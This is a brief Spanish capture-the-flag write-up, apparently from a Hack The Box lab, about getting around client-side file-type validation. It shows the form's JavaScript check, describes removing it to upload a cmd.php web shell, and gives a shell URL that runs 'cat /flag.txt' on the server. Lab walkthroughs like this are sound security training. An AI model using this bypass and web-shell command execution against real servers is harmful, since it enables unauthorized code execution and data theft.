# Laboratorio: Upload Exploitation 📃

1. Visitamos la página web

<p align="center">
    <img src="./assets/Validations/01-Web.PNG" width=400>
</p>

---

2. Analizamos las validaciones del **lado del cliente**

```html
<form id="uploadForm" action="upload.php" method="POST" enctype="multipart/form-data" onsubmit="if(validate()){upload()}">
```

* La validación es `onsubmit="if(validate()){upload()}"`

---

3. Si analizamos el código `script.js`
* **URL:** `http://[IP]/script.js`

```js
function validate() {
  var file = $("#uploadFile")[0].files[0];
  var filename = file.name;
  var extension = filename.split('.').pop();

  if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
    $('#error_message').text("Only images are allowed!");
    File.form.reset();
    $("#submit").attr("disabled", true);
    return false;
  } else {
    return true;
  }
}
```

---

4. Eliminamos la función `validate` para subir `cmd.php`

---

5. Visitamos la url `/profile_images/cmd.php` y leemos la **flag** 🏴
   
* **URL:** `http://[IP]/profile_images/cmd.php?cmd=cat%20/flag.txt`

**Output**
```
HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}
```